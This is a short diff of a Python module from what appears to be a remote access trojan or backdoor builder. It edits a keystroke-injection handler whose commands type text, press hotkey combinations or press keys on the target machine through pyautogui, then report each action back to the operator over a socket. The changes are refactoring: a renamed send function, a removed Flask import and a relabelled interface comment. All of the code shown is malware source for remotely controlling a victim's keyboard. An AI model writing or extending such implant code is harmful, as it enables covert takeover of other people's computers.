@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -16,17 +15,17 @@ def inject_keystokes(args):
     injecting = args.split(' ',1)[1]
     if command == "inj_t":
         pyautogui.typewrite(injecting)
-        main_send('[+]Injected keystrokes : ' + injecting, s)
+        send_all(s,'[+]Injected keystrokes : ' + injecting)
     elif command == "inj_h":
         injecting = injecting.split(' ')
         for i in injecting:
             pyautogui.keyDown(i)
         for i in reversed(injecting):
             pyautogui.keyUp(i)
-        main_send('[+]Injected hotkeys : ' + ' '.join(injecting), s)
+        send_all(s,'[+]Injected hotkeys : ' + ' '.join(injecting))
     elif command == "inj_p":
         pyautogui.press(injecting)
-        main_send('[+]Injected button press : ' + injecting, s)
+        send_all(s,'[+]Injected button press : ' + injecting)
 ''')
         config.logics.append('''
             elif command in ("inj_t","inj_h","inj_p"):
